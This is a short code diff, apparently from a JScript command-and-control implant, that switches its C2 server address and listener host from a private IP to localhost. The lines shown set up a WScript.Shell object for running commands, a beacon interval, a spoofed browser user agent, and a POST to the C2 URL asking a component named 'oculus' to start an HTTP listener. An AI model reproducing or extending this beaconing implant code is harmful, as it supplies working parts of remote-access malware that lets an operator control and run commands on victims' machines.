@@ -3,7 +3,7 @@
 //#######################
 var curcmd = "";
 var serverMsg = "";
-var c2url = "http://10.0.0.134:29000";
+var c2url = "http://localhost:29000";
 var objShell = new ActiveXObject("WScript.Shell");
 var beaconTime = 3000;
 var useragent = "Mozilla/5.0 (compatible, MSIE 11, Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko";
@@ -68,7 +68,7 @@ function webPost(target, cmdResponse) {
 }
 
 var target = c2url + uri;
-var cmdResponse = '{"component": "oculus", "action": { "start_listener": { "name": "httplistener", "type": "http", "lport": "80", "lhost": "10.0.0.134"}}}';
+var cmdResponse = '{"component": "oculus", "action": { "start_listener": { "name": "httplistener", "type": "http", "lport": "80", "lhost": "127.0.0.1"}}}';
 webPost(target, cmdResponse);
 
 
